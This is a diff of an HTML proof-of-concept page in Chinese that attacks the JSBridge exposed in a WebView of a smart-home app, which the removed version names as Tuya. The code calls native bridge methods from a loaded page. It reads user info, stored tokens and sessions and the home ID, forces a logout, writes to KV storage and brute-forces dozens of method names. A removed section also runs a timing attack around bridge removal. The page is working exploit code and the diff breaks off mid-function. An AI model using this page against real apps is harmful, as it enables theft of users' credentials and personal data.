@@ -3,1043 +3,376 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>涂鸦智能 WebView 漏洞验证 PoC</title>
+    <title>JSBridge 风险验证 PoC</title>
     <style>
         body {
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
-            max-width: 900px;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            max-width: 1200px;
             margin: 20px auto;
             padding: 20px;
-            background-color: #f0f2f5;
+            background: #f5f5f5;
         }
+        h1 { color: #d32f2f; text-align: center; }
+        h2 { color: #333; border-bottom: 2px solid #ddd; padding-bottom: 8px; }
         .container {
             background: white;
             padding: 30px;
             border-radius: 12px;
-            box-shadow: 0 2px 12px rgba(0,0,0,0.1);
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
         }
-        h1 {
-            color: #d9534f;
-            border-bottom: 3px solid #d9534f;
-            padding-bottom: 15px;
-            margin-top: 0;
-        }
-        .test-section {
-            margin: 25px 0;
-            padding: 20px;
-            border: 1px solid #e0e0e0;
-            border-radius: 8px;
-            background: #fafafa;
-        }
-        .test-section h3 {
-            color: #337ab7;
-            margin-top: 0;
-            border-bottom: 1px solid #ddd;
-            padding-bottom: 10px;
-        }
-        button {
-            background-color: #337ab7;
+        .section { margin: 25px 0; padding: 20px; border: 1px solid #ddd; border-radius: 8px; background: #fafafa; }
+        .btn {
+            display: inline-block;
+            background: #d32f2f;
             color: white;
             border: none;
             padding: 12px 24px;
-            margin: 8px 5px;
+            margin: 8px;
             border-radius: 6px;
             cursor: pointer;
+            font-weight: bold;
             font-size: 14px;
-            font-weight: 500;
-            transition: background 0.3s;
         }
-        button:hover {
-            background-color: #286090;
-        }
-        button.danger {
-            background-color: #d9534f;
-        }
-        button.danger:hover {
-            background-color: #c9302c;
-        }
-        button.success {
-            background-color: #5cb85c;
-        }
-        button.success:hover {
-            background-color: #4cae4c;
-        }
-        #output {
-            background-color: #1e1e1e;
-            color: #d4d4d4;
-            padding: 20px;
-            margin-top: 20px;
-            border-radius: 8px;
-            font-family: 'Consolas', 'Monaco', monospace;
-            font-size: 13px;
-            white-space: pre-wrap;
-            line-height: 1.6;
-            max-height: 500px;
+        .btn:hover { background: #b71c1c; }
+        .btn.green { background: #388e3c; }
+        .btn.green:hover { background: #2e7d32; }
+        .btn.blue { background: #1976d2; }
+        .btn.blue:hover { background: #1565c0; }
+        .result-box {
+            background: #1a1a1a;
+            color: #0f0;
+            padding: 15px;
+            border-radius: 6px;
+            margin: 10px 0;
+            font-family: monospace;
+            max-height: 400px;
             overflow-y: auto;
+            white-space: pre-wrap;
+            word-wrap: break-word;
         }
-        .info {
-            background-color: #d9edf7;
-            border: 1px solid #31708f;
-            color: #31708f;
-            padding: 15px;
-            margin: 15px 0;
-            border-radius: 6px;
-        }
-        .warning {
-            background-color: #fcf8e3;
-            border: 1px solid #8a6d3b;
-            color: #8a6d3b;
-            padding: 15px;
-            margin: 15px 0;
-            border-radius: 6px;
-        }
-        .success-box {
-            background-color: #dff0d8;
-            border: 1px solid #3c763d;
-            color: #3c763d;
-            padding: 15px;
-            margin: 15px 0;
-            border-radius: 6px;
-        }
-        .log-success { color: #4cd964; }
-        .log-error { color: #ff3b30; }
-        .log-warning { color: #ffcc00; }
-        .log-info { color: #5ac8fa; }
-        .stat-box {
-            display: inline-block;
-            background: #333;
-            color: white;
-            padding: 5px 12px;
-            border-radius: 4px;
-            margin: 2px;
-            font-size: 12px;
-        }
+        .success { color: #4caf50; }
+        .error { color: #f44336; }
+        .info { color: #2196f3; }
+        .warning { color: #ff9800; }
+        .grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(250px, 1fr)); gap: 15px; margin-top: 15px; }
+        .card { padding: 15px; background: white; border: 1px solid #ddd; border-radius: 8px; }
     </style>
 </head>
 <body>
     <div class="container">
-        <h1>⚠️ 涂鸦智能 WebView 漏洞验证 PoC</h1>
+        <h1>🔴 JSBridge 风险验证 PoC</h1>
         
-        <div class="warning">
-            <strong>⚠️ 重要声明：</strong>此页面仅用于授权的安全测试和漏洞验证！
-            <br>请在获得明确授权的环境中使用，禁止用于非法用途。
+        <div class="section">
+            <h2>1️⃣ 基础检测</h2>
+            <button class="btn" onclick="checkBridge()">检测 _dsbridge</button>
+            <div id="basicResult" class="result-box"></div>
         </div>
-
-        <div class="info">
-            <strong>📋 验证目标：</strong>
-            <ul>
-                <li>✅ 时序攻击：验证在 JSBridge 被移除前能否调用</li>
-                <li>✅ 白名单绕过：验证非白名单域名是否可加载</li>
-                <li>✅ 接口调用：验证敏感 JSComponent 接口可用性</li>
-            </ul>
+        
+        <div class="section">
+            <h2>2️⃣ 高风险 - 用户组件</h2>
+            <div class="grid">
+                <div class="card">
+                    <h4>获取用户信息</h4>
+                    <button class="btn green" onclick="testUserInfo()">getUserInfo()</button>
+                </div>
+                <div class="card">
+                    <h4>强制退出</h4>
+                    <button class="btn" onclick="testLogout()">logout()</button>
+                </div>
+            </div>
+            <div id="userResult" class="result-box"></div>
         </div>
-
-        <!-- 状态栏 -->
-        <div id="status-bar" style="margin: 15px 0;">
-            <span class="stat-box">页面加载: <span id="status-page">⏳</span></span>
-            <span class="stat-box">JSBridge: <span id="status-jsbridge">⏳</span></span>
-            <span class="stat-box">用户信息: <span id="status-user">⏳</span></span>
-            <span class="stat-box">App 信息: <span id="status-app">⏳</span></span>
-            <span class="stat-box">家庭 ID: <span id="status-home">⏳</span></span>
-            <span class="stat-box">KV 存储: <span id="status-kv">⏳</span></span>
+        
+        <div class="section">
+            <h2>3️⃣ 高风险 - KV存储</h2>
+            <div class="grid">
+                <div class="card">
+                    <h4>读取 Token</h4>
+                    <button class="btn green" onclick="testKvGet('token')">kv.get('token')</button>
+                </div>
+                <div class="card">
+                    <h4>读取 Session</h4>
+                    <button class="btn green" onclick="testKvGet('session')">kv.get('session')</button>
+                </div>
+                <div class="card">
+                    <h4>写入测试</h4>
+                    <button class="btn blue" onclick="testKvSet()">kv.set()</button>
+                </div>
+            </div>
+            <div id="kvResult" class="result-box"></div>
         </div>
-
-        <!-- 测试 1: 极速检测（时序攻击） -->
-        <div class="test-section">
-            <h3>⚡ 测试 1: 极速检测（时序攻击验证）</h3>
-            <p style="color: #666; font-size: 13px; margin-top: 5px;">
-                在页面加载早期（JSBridge 可能还未被移除时）进行检测
-            </p>
-            <div id="rapid-results"></div>
+        
+        <div class="section">
+            <h2>4️⃣ 中风险 - App信息</h2>
+            <div class="grid">
+                <div class="card">
+                    <h4>获取 App 信息</h4>
+                    <button class="btn green" onclick="testAppInfo()">app.getInfo()</button>
+                </div>
+                <div class="card">
+                    <h4>获取 Scheme</h4>
+                    <button class="btn green" onclick="testAppScheme()">app.getScheme()</button>
+                </div>
+            </div>
+            <div id="appResult" class="result-box"></div>
         </div>
-
-        <!-- 测试 2: 基础检测 -->
-        <div class="test-section">
-            <h3>🔍 测试 2: JSBridge 基础检测</h3>
-            <button onclick="detectAllBridges()">检测所有 JSBridge</button>
-            <button onclick="listWindowObjects()">列出 window 对象</button>
+        
+        <div class="section">
+            <h2>5️⃣ 家庭数据</h2>
+            <button class="btn green" onclick="testHomeData()">home_data.getHomeId()</button>
+            <div id="homeResult" class="result-box"></div>
         </div>
-
-        <!-- 测试 3: User 组件（高危） -->
-        <div class="test-section">
-            <h3>👤 测试 3: User 组件（高危）</h3>
-            <button onclick="testUserGetInfo()" class="danger">获取用户信息</button>
-            <button onclick="testUserLogout()" class="danger">强制退出登录</button>
+        
+        <div class="section">
+            <h2>6️⃣ 暴力枚举（大量方法）</h2>
+            <button class="btn" onclick="bruteForceAll()">开始枚举 50+ 个方法</button>
+            <div id="bruteResult" class="result-box"></div>
         </div>
-
-        <!-- 测试 4: AppInfo 组件（中危） -->
-        <div class="test-section">
-            <h3>📱 测试 4: AppInfo 组件</h3>
-            <button onclick="testAppGetInfo()">获取 App 信息</button>
-            <button onclick="testAppGetScheme()">获取 App Scheme</button>
+        
+        <div class="section">
+            <h2>7️⃣ 自定义调用</h2>
+            <div style="margin-bottom: 15px;">
+                <input type="text" id="customMethod" value="plugin.user.getUserInfo" style="width: 60%; padding: 10px;">
+                <input type="text" id="customParam" value="null" placeholder='参数' style="width: 30%; padding: 10px;">
+            </div>
+            <button class="btn blue" onclick="customCall()">调用</button>
+            <div id="customResult" class="result-box"></div>
         </div>
-
-        <!-- 测试 5: KV 组件（高危） -->
-        <div class="test-section">
-            <h3>💾 测试 5: KV 存储组件（高危）</h3>
-            <button onclick="testKVGet('test_key')">读取 KV</button>
-            <button onclick="testKVSet('test_key', 'test_value_' + Date.now())" class="success">写入 KV</button>
-            <button onclick="testKVRemove('test_key')" class="danger">删除 KV</button>
+        
+        <div class="section">
+            <h2>📊 结果汇总</h2>
+            <button class="btn blue" onclick="exportResults()">导出结果</button>
+            <button class="btn" onclick="clearAll()">清空</button>
+            <div id="summary" class="result-box"></div>
         </div>
-
-        <!-- 测试 6: HomeData 组件 -->
-        <div class="test-section">
-            <h3>🏠 测试 6: HomeData 组件</h3>
-            <button onclick="testHomeGetId()">获取家庭 ID</button>
-        </div>
-
-        <!-- 测试 7: Phone 组件 -->
-        <div class="test-section">
-            <h3>📞 测试 7: Phone 组件</h3>
-            <button onclick="testPhoneHandleNumber('10086')">拨打电话/复制</button>
-        </div>
-
-        <!-- 测试 8: Navigator 组件 -->
-        <div class="test-section">
-            <h3>🧭 测试 8: Navigator 组件</h3>
-            <button onclick="testNavTitle('测试标题')">设置标题</button>
-            <button onclick="testNavGoRouter('test://route')">路由跳转</button>
-        </div>
-
-        <!-- 测试 9: 枚举所有组件 -->
-        <div class="test-section">
-            <h3>📦 测试 9: 枚举所有 JSComponent</h3>
-            <button onclick="enumerateAllComponents()">完整枚举</button>
-            <button onclick="enumerateDSBridgeMethods()" class="danger">枚举 DSBridge 方法</button>
-        </div>
-
-        <!-- 测试 11: 特殊位置检测 -->
-        <div class="test-section" style="border: 2px solid #d9534f; background: #fff3f3;">
-            <h3>🕵️ 测试 11: 特殊位置检测 (新发现!)</h3>
-            <p style="color: #d9534f; font-weight: bold;">检测 webkitRequestAnimationFrame 下的隐藏方法</p>
-            <button onclick="detectSpecialLocations()" class="danger">检测特殊位置</button>
-            <button onclick="tryTestUserGetInfo()" class="danger">尝试调用 testUsergetinfo</button>
-        </div>
-
-        <!-- 测试 10: 信息导出 -->
-        <div class="test-section">
-            <h3>📤 测试 10: 导出测试结果</h3>
-            <button onclick="exportResults()">导出为 JSON</button>
-            <button onclick="copyResults()">复制结果</button>
-        </div>
-
-        <!-- 输出区域 -->
-        <h3>📝 测试日志</h3>
-        <div id="output">等待测试开始...</div>
     </div>
-
+    
     <script>
-        // 测试结果存储
-        const testResults = {
-            startTime: new Date().toISOString(),
-            userAgent: navigator.userAgent,
-            tests: {},
-            data: {}
+        const results = {
+            timestamp: new Date().toISOString(),
+            checks: [],
+            findings: []
         };
-
-        // 可能的 JSBridge 名称
-        const possibleBridgeNames = [
-            'nativeJSBridge',
-            'dsBridge',
-            '_dsbridge',
-            '_dsb',
-            'tyJsBridge',
-            'jsbridge',
-            'JsBridge'
-        ];
-
-        // 检测到的桥接对象
-        let detectedBridge = null;
-
-        function updateStatus(elementId, status, isSuccess) {
-            const el = document.getElementById(elementId);
-            if (el) {
-                el.innerHTML = isSuccess ? '✅' : (status === 'fail' ? '❌' : '⏳');
-            }
+        
+        function log(el, msg, type) {
+            const ts = new Date().toLocaleTimeString();
+            const colorClass = type ? type : 'info';
+            el.innerHTML += `<div class="${colorClass}">[${ts}] ${msg}</div>`;
+            el.scrollTop = el.scrollHeight;
         }
-
-        function log(message, type = 'info') {
-            const output = document.getElementById('output');
-            const timestamp = new Date().toLocaleTimeString();
-            const prefix = type === 'success' ? '✅' : (type === 'error' ? '❌' : (type === 'warning' ? '⚠️' : 'ℹ️'));
-            const colorClass = type === 'success' ? 'log-success' : (type === 'error' ? 'log-error' : (type === 'warning' ? 'log-warning' : 'log-info'));
+        
+        function checkBridge() {
+            const out = document.getElementById('basicResult');
+            out.innerHTML = '';
             
-            const logLine = `<span class="${colorClass}">[${timestamp}] ${prefix} ${message}</span>\n`;
-            output.innerHTML = logLine + output.innerHTML;
-            console.log(`[${type.toUpperCase()}] ${message}`);
-        }
-
-        function logJSON(obj, type = 'info') {
-            log(typeof obj === 'string' ? obj : JSON.stringify(obj, null, 2), type);
-        }
-
-        // =========================================================
-        // 测试 1: 极速检测（时序攻击验证）
-        // =========================================================
-        (function rapidDetection() {
-            const results = [];
+            log(out, '正在检测 _dsbridge 对象...', 'info');
             
-            // 立即检测
-            for (const name of possibleBridgeNames) {
+            const bridgeNames = ['_dsbridge', '_dsb', 'dsbridge', 'dsBridge', 'nativeJSBridge'];
+            let found = false;
+            
+            for (const name of bridgeNames) {
                 if (window[name]) {
-                    results.push({ name, status: 'found', time: 0 });
-                    detectedBridge = window[name];
-                    log(`⚡ [0ms] 立即检测到 ${name}!`, 'success');
-                    updateStatus('status-jsbridge', 'success', true);
-                }
-            }
-
-            // 检测特殊位置
-            const specialChecks = ['webkitRequestAnimationFrame'];
-            for (const loc of specialChecks) {
-                if (window[loc]) {
+                    log(out, `✅ 发现: ${name}`, 'success');
+                    found = true;
+                    results.checks.push({ type: 'bridge', name: name, available: true });
+                    
                     try {
-                        const props = Object.getOwnPropertyNames(window[loc]);
-                        for (const prop of props) {
-                            if (prop.toLowerCase().includes('user') || prop.toLowerCase().includes('getinfo')) {
-                                results.push({ name: `${loc}.${prop}`, status: 'found_special', time: 0 });
-                                log(`⚡ [0ms] 特殊检测到 ${loc}.${prop}!`, 'success');
-                            }
-                        }
-                    } catch (e) {}
-                }
-            }
-
-            // 多次快速检测
-            let attempts = 0;
-            const interval = setInterval(() => {
-                attempts++;
-                for (const name of possibleBridgeNames) {
-                    if (window[name] && !results.find(r => r.name === name && r.status === 'found')) {
-                        results.push({ name, status: 'found', time: attempts * 50 });
-                        detectedBridge = window[name];
-                        log(`⚡ [${attempts * 50}ms] 检测到 ${name}!`, 'success');
-                        updateStatus('status-jsbridge', 'success', true);
-                    }
-                }
-                
-                if (attempts >= 20) {
-                    clearInterval(interval);
-                    showRapidResults(results);
-                }
-            }, 50);
-
-            updateStatus('status-page', 'success', true);
-        })();
-
-        function showRapidResults(results) {
-            const container = document.getElementById('rapid-results');
-            if (results.length > 0) {
-                container.innerHTML = `
-                    <div class="success-box">
-                        <strong>✅ 时序攻击验证成功！</strong><br>
-                        <p>在页面加载早期检测到 ${results.length} 个 JSBridge 对象：</p>
-                        <ul>
-                            ${results.map(r => `<li><strong>${r.name}</strong> - ${r.time}ms</li>`).join('')}
-                        </ul>
-                        <p>这表明在白名单验证/JSBridge 移除前，恶意代码就已经可以执行！</p>
-                    </div>
-                `;
-            } else {
-                container.innerHTML = `
-                    <div class="info">
-                        <strong>ℹ️ 未检测到 JSBridge</strong><br>
-                        <p>可能原因：加载太慢或已被移除</p>
-                    </div>
-                `;
-            }
-        }
-
-        // =========================================================
-        // 测试 2: 基础检测
-        // =========================================================
-        function detectAllBridges() {
-            log('开始检测所有可能的 JSBridge...');
-            
-            let found = 0;
-            for (const name of possibleBridgeNames) {
-                if (window[name]) {
-                    log(`✅ 发现 ${name}`, 'success');
-                    found++;
-                    detectedBridge = window[name];
-                    testResults.tests[name] = 'found';
-                }
-            }
-            
-            if (found === 0) {
-                log('❌ 未发现已知 JSBridge', 'error');
-            } else {
-                log(`共发现 ${found} 个 JSBridge 对象`, 'success');
-            }
-        }
-
-        function listWindowObjects() {
-            log('枚举 window 对象的属性...');
-            const allProps = Object.getOwnPropertyNames(window);
-            const interestingProps = allProps.filter(p => 
-                /bridge/i.test(p) || /native/i.test(p) || /js/i.test(p)
-            );
-            logJSON(interestingProps);
-            testResults.data.windowProps = interestingProps;
-        }
-
-        // =========================================================
-        // 检测特殊位置的 JSBridge
-        // =========================================================
-        function detectSpecialLocations() {
-            log('🔍 检测特殊位置的 JSBridge...');
-            
-            const specialLocations = [
-                'webkitRequestAnimationFrame',
-                'requestAnimationFrame',
-                'webkitCancelAnimationFrame',
-                'cancelAnimationFrame',
-                'webkitMutationObserver',
-                'MutationObserver'
-            ];
-            
-            const findings = [];
-            
-            for (const loc of specialLocations) {
-                if (window[loc]) {
-                    log(`检查 ${loc}...`);
-                    try {
-                        // 列出所有属性
-                        const props = Object.getOwnPropertyNames(window[loc]);
-                        for (const prop of props) {
-                            if (prop.toLowerCase().includes('user') || 
-                                prop.toLowerCase().includes('getinfo') ||
-                                prop.toLowerCase().includes('bridge') ||
-                                prop.toLowerCase().includes('native')) {
-                                log(`✅ 发现可疑属性: ${loc}.${prop}`, 'success');
-                                findings.push({ location: loc, property: prop, value: window[loc][prop] });
-                                
-                                // 尝试调用
-                                if (typeof window[loc][prop] === 'function') {
-                                    try {
-                                        const result = window[loc][prop]();
-                                        log(`   🎯 调用成功! 结果: ${JSON.stringify(result)}`, 'success');
-                                        findings.push({ location: loc, property: prop, result: result });
-                                    } catch (e) {
-                                        log(`   ⚠️ 调用失败: ${e.message}`, 'warning');
-                                    }
-                                }
-                            }
-                        }
-                        
-                        // 检查原型链
-                        let proto = Object.getPrototypeOf(window[loc]);
-                        let depth = 0;
-                        while (proto && depth < 5) {
-                            const protoProps = Object.getOwnPropertyNames(proto);
-                            for (const prop of protoProps) {
-                                if (prop.toLowerCase().includes('user') || 
-                                    prop.toLowerCase().includes('getinfo') ||
-                                    prop.toLowerCase().includes('bridge')) {
-                                    log(`✅ 发现原型属性: ${loc}.prototype.${prop}`, 'success');
-                                }
-                            }
-                            proto = Object.getPrototypeOf(proto);
-                            depth++;
-                        }
+                        const props = Object.getOwnPropertyNames(window[name]);
+                        log(out, `属性: ${props.join(', ')}`, 'info');
                     } catch (e) {
-                        log(`检查 ${loc} 失败: ${e.message}`, 'warning');
+                        log(out, `获取属性失败: ${e.message}`, 'error');
                     }
                 }
             }
             
-            if (findings.length > 0) {
-                logJSON(findings, 'success');
-                testResults.data.specialFindings = findings;
-            } else {
-                log('未发现特殊位置的可疑属性');
+            if (!found) {
+                log(out, '❌ 未发现 _dsbridge 对象', 'error');
+                results.checks.push({ type: 'bridge', available: false });
             }
             
-            return findings;
+            updateSummary();
         }
-
-        // 尝试调用 testUsergetinfo
-        function tryTestUserGetInfo() {
-            log('🧪 尝试调用 testUsergetinfo...');
+        
+        function callBridge(method, params, callback, elementId) {
+            const out = document.getElementById(elementId);
+            let bridge = window._dsbridge || window._dsb;
             
-            const possiblePaths = [
-                // 直接在 window 上
-                'testUsergetinfo',
-                'testUserGetInfo',
-                'testusergetinfo',
-                'TestUserGetInfo',
-                
-                // 在 webkitRequestAnimationFrame 下
-                'webkitRequestAnimationFrame.testUsergetinfo',
-                'webkitRequestAnimationFrame.testUserGetInfo',
-                'webkitRequestAnimationFrame.testusergetinfo',
-                
-                // 在 requestAnimationFrame 下
-                'requestAnimationFrame.testUsergetinfo',
-                'requestAnimationFrame.testUserGetInfo',
-                
-                // 其他可能的位置
-                'webkitRequestAnimationFrame.getUserInfo',
-                'requestAnimationFrame.getUserInfo',
-                'webkitRequestAnimationFrame.user',
-                'requestAnimationFrame.user'
-            ];
-            
-            for (const path of possiblePaths) {
-                try {
-                    const parts = path.split('.');
-                    let obj = window;
-                    let valid = true;
-                    
-                    for (const part of parts) {
-                        if (obj && typeof obj === 'object' && part in obj) {
-                            obj = obj[part];
-                        } else {
-                            valid = false;
-                            break;
-                        }
-                    }
-                    
-                    if (valid) {
-                        log(`✅ 找到: ${path}`, 'success');
-                        
-                        if (typeof obj === 'function') {
-                            log(`   🎯 尝试调用...`);
-                            try {
-                                // 尝试不带参数
-                                const result1 = obj();
-                                log(`   ✅ 无参数调用成功: ${JSON.stringify(result1)}`, 'success');
-                                
-                                // 尝试带 null 参数
-                                const result2 = obj(null);
-                                log(`   ✅ null 参数调用成功: ${JSON.stringify(result2)}`, 'success');
-                                
-                                testResults.data.testUserGetInfoResult = { path, result1, result2 };
-                            } catch (e) {
-                                log(`   ⚠️ 调用失败: ${e.message}`, 'warning');
-                            }
-                        } else {
-                            log(`   📄 值: ${JSON.stringify(obj)}`);
-                        }
-                    }
-                } catch (e) {
-                    // 忽略错误
-                }
-            }
-        }
-
-        // =========================================================
-        // dsbridge 通用调用函数
-        // =========================================================
-        function callDSBridge(method, params, callback) {
-            if (window._dsbridge && typeof window._dsbridge.call === 'function') {
-                log(`调用 _dsbridge.call('${method}', ${JSON.stringify(params)})`);
-                try {
-                    window._dsbridge.call(method, params, callback);
-                    return true;
-                } catch (e) {
-                    log(`_dsbridge.call 异常: ${e.message}`, 'error');
-                }
-            }
-            if (window._dsb && typeof window._dsb.call === 'function') {
-                log(`调用 _dsb.call('${method}', ${JSON.stringify(params)})`);
-                try {
-                    window._dsb.call(method, params, callback);
-                    return true;
-                } catch (e) {
-                    log(`_dsb.call 异常: ${e.message}`, 'error');
-                }
-            }
-            if (window.dsBridge && typeof window.dsBridge.call === 'function') {
-                log(`调用 dsBridge.call('${method}', ${JSON.stringify(params)})`);
-                try {
-                    window.dsBridge.call(method, params, callback);
-                    return true;
-                } catch (e) {
-                    log(`dsBridge.call 异常: ${e.message}`, 'error');
-                }
-            }
-            return false;
-        }
-
-        // 枚举所有可能的 dsbridge 方法
-        function enumerateDSBridgeMethods() {
-            log('尝试枚举所有可能的 DSBridge 方法...');
-            
-            const testMethods = [
-                'plugin.user.getUserInfo',
-                'plugin.user.logout',
-                'plugin.app.getInfo',
-                'plugin.app.getScheme',
-                'plugin.kv.get',
-                'plugin.kv.set',
-                'plugin.kv.remove',
-                'plugin.home_data.getHomeId',
-                'plugin.phone.handlePhoneNumber',
-                'plugin.nav.setTitle',
-                'plugin.nav.gotoRouter',
-                'user.getUserInfo',
-                'user.logout',
-                'app.getInfo',
-                'app.getScheme',
-                'kv.get',
-                'kv.set',
-                'kv.remove',
-                'home_data.getHomeId',
-                'phone.handlePhoneNumber',
-                'nav.setTitle',
-                'nav.gotoRouter',
-                'getUserInfo',
-                'logout',
-                'getAppInfo',
-                'getScheme',
-                'getHomeId'
-            ];
-
-            const results = [];
-            let tested = 0;
-
-            function testNext() {
-                if (tested >= testMethods.length) {
-                    logJSON(results, results.length > 0 ? 'success' : 'info');
-                    testResults.data.dsbridgeMethods = results;
-                    return;
-                }
-
-                const method = testMethods[tested];
-                tested++;
-                
-                callDSBridge(method, null, function(result) {
-                    if (result !== undefined && result !== null) {
-                        log(`✅ ${method} 返回结果: ${JSON.stringify(result)}`, 'success');
-                        results.push({ method, result: result });
-                    }
-                    setTimeout(testNext, 100);
-                });
-            }
-
-            testNext();
-        }
-
-        // =========================================================
-        // 测试 3: User 组件（高危）
-        // =========================================================
-        function testUserGetInfo() {
-            log('测试 User.getUserInfo()...');
-            
-            let success = false;
-            
-            // 尝试直接对象调用
-            try {
-                if (window.plugin && window.plugin.user && typeof window.plugin.user.getUserInfo === 'function') {
-                    const result = window.plugin.user.getUserInfo(null);
-                    log('✅ plugin.user.getUserInfo 调用成功!', 'success');
-                    logJSON(result, 'success');
-                    testResults.data.userInfo = result;
-                    updateStatus('status-user', 'success', true);
-                    success = true;
-                }
-            } catch (e) {
-                log('直接调用失败: ' + e.message, 'warning');
-            }
-
-            // 尝试 dsbridge 调用
-            if (!success) {
-                const methods = ['plugin.user.getUserInfo', 'user.getUserInfo', 'getUserInfo'];
-                let tested = 0;
-                
-                function tryNextMethod() {
-                    if (tested >= methods.length) {
-                        log('❌ User 组件不可用', 'error');
-                        return;
-                    }
-                    
-                    const method = methods[tested];
-                    tested++;
-                    
-                    if (callDSBridge(method, null, function(result) {
-                        if (result !== undefined) {
-                            log(`✅ ${method} 调用成功!`, 'success');
-                            logJSON(result, 'success');
-                            testResults.data.userInfo = result;
-                            updateStatus('status-user', 'success', true);
-                        } else {
-                            tryNextMethod();
-                        }
-                    })) {
-                        // 等待回调
-                    } else {
-                        tryNextMethod();
-                    }
-                }
-                
-                tryNextMethod();
-            }
-        }
-
-        function testUserLogout() {
-            log('⚠️ 测试 logout() - 这将退出当前登录！');
-            
-            if (!confirm('确定要测试退出登录吗？这将清除当前登录状态！')) {
-                log('用户取消测试');
+            if (!bridge) {
+                log(out, '❌ _dsbridge 不可用', 'error');
                 return;
             }
             
-            const methods = ['plugin.user.logout', 'user.logout', 'logout'];
-            let tried = 0;
-            
-            function tryNext() {
-                if (tried >= methods.length) {
-                    log('❌ 所有方法均失败', 'error');
-                    return;
-                }
-                
-                const method = methods[tried];
-                tried++;
-                
-                if (callDSBridge(method, null, function(result) {
-                    log('✅ logout 调用完成', 'success');
-                    logJSON(result);
-                })) {
-                    // 回调处理
-                } else {
-                    tryNext();
-                }
-            }
-            
-            tryNext();
-        }
-
-        // =========================================================
-        // 测试 4: AppInfo 组件
-        // =========================================================
-        function testAppGetInfo() {
-            log('测试 App.getInfo()...');
-            
-            const methods = ['plugin.app.getInfo', 'app.getInfo', 'getAppInfo'];
-            let tried = 0;
-            
-            function tryNext() {
-                if (tried >= methods.length) {
-                    log('❌ AppInfo 组件不可用', 'error');
-                    return;
-                }
-                
-                const method = methods[tried];
-                tried++;
-                
-                if (callDSBridge(method, null, function(result) {
-                    if (result !== undefined) {
-                        log(`✅ ${method} 调用成功!`, 'success');
-                        logJSON(result, 'success');
-                        testResults.data.appInfo = result;
-                        updateStatus('status-app', 'success', true);
-                    } else {
-                        tryNext();
-                    }
-                })) {
-                    // 等待回调
-                } else {
-                    tryNext();
-                }
-            }
-            
-            tryNext();
-        }
-
-        function testAppGetScheme() {
-            log('测试 App.getScheme()...');
-            
-            const methods = ['plugin.app.getScheme', 'app.getScheme', 'getScheme'];
-            let tried = 0;
-            
-            function tryNext() {
-                if (tried >= methods.length) {
-                    log('❌ Scheme 方法不可用', 'error');
-                    return;
-                }
-                
-                const method = methods[tried];
-                tried++;
-                
-                if (callDSBridge(method, null, function(result) {
-                    if (result !== undefined) {
-                        log(`✅ ${method} 调用成功!`, 'success');
-                        logJSON(result);
-                        testResults.data.scheme = result;
-                    } else {
-                        tryNext();
-                    }
-                })) {
-                    // 等待回调
-                } else {
-                    tryNext();
-                }
-            }
-            
-            tryNext();
-        }
-
-        // =========================================================
-        // 测试 5: KV 组件（高危）
-        // =========================================================
-        function testKVGet(key) {
-            log(`测试 KV.get('${key}')...`);
-            
-            const methods = ['plugin.kv.get', 'kv.get'];
-            let tried = 0;
-            
-            function tryNext() {
-                if (tried >= methods.length) {
-                    log('❌ KV 组件不可用', 'error');
-                    return;
-                }
-                
-                const method = methods[tried];
-                tried++;
-                
-                if (callDSBridge(method, key, function(result) {
-                    log(`✅ ${method} 调用成功!`, 'success');
-                    log(`Key: ${key} = ${JSON.stringify(result)}`, 'success');
-                    testResults.data.kv = testResults.data.kv || {};
-                    testResults.data.kv[key] = result;
-                    updateStatus('status-kv', 'success', true);
-                })) {
-                    // 等待回调
-                } else {
-                    tryNext();
-                }
-            }
-            
-            tryNext();
-        }
-
-        function testKVSet(key, value) {
-            log(`测试 KV.set('${key}', '${value}')...`);
-            
-            const methods = ['plugin.kv.set', 'kv.set'];
-            let tried = 0;
-            
-            function tryNext() {
-                if (tried >= methods.length) {
-                    log('❌ KV 组件不可用', 'error');
-                    return;
-                }
-                
-                const method = methods[tried];
-                tried++;
-                
-                if (callDSBridge(method, { k: key, v: value }, function(result) {
-                    log(`✅ ${method} 调用成功!`, 'success');
-                    logJSON(result);
-                    updateStatus('status-kv', 'success', true);
-                })) {
-                    // 等待回调
-                } else {
-                    tryNext();
-                }
-            }
-            
-            tryNext();
-        }
-
-        function testKVRemove(key) {
-            log(`测试 KV.remove('${key}')...`);
-            
-            const methods = ['plugin.kv.remove', 'kv.remove'];
-            let tried = 0;
-            
-            function tryNext() {
-                if (tried >= methods.length) {
-                    log('❌ KV 组件不可用', 'error');
-                    return;
-                }
-                
-                const method = methods[tried];
-                tried++;
-                
-                if (callDSBridge(method, key, function(result) {
-                    log(`✅ ${method} 调用成功!`, 'success');
-                    logJSON(result);
-                })) {
-                    // 等待回调
-                } else {
-                    tryNext();
-                }
-            }
-            
-            tryNext();
-        }
-
-        // =========================================================
-        // 测试 6: HomeData 组件
-        // =========================================================
-        function testHomeGetId() {
-            log('测试 HomeData.getHomeId()...');
-            
-            const methods = ['plugin.home_data.getHomeId', 'home_data.getHomeId', 'getHomeId'];
-            let tried = 0;
-            
-            function tryNext() {
-                if (tried >= methods.length) {
-                    log('❌ HomeData 组件不可用', 'error');
-                    return;
-                }
-                
-                const method = methods[tried];
-                tried++;
-                
-                if (callDSBridge(method, null, function(result) {
-                    if (result !== undefined) {
-                        log(`✅ ${method} 调用成功!`, 'success');
-                        logJSON(result, 'success');
-                        testResults.data.homeId = result;
-                        updateStatus('status-home', 'success', true);
-                    } else {
-                        tryNext();
-                    }
-                })) {
-                    // 等待回调
-                } else {
-                    tryNext();
-                }
-            }
-            
-            tryNext();
-        }
-
-        // =========================================================
-        // 测试 7: Phone 组件
-        // =========================================================
-        function testPhoneHandleNumber(phoneNumber) {
-            log(`测试 phone.handlePhoneNumber('${phoneNumber}')...`);
+            log(out, `调用: ${method}(${JSON.stringify(params)})`, 'info');
             
             try {
-                if (window.phone && typeof window.phone.handlePhoneNumber === 'function') {
-                    window.phone.handlePhoneNumber(JSON.stringify({ phoneNumber }));
-                    log('✅ handlePhoneNumber 调用完成', 'success');
-                } else {
-                    log('❌ Phone 组件不可用', 'error');
-                }
+                bridge.call(method, params, function(result) {
+                    if (result !== undefined && result !== null) {
+                        log(out, `✅ 返回: ${JSON.stringify(result)}`, 'success');
+                        results.findings.push({
+                            method: method,
+                            result: result
+                        });
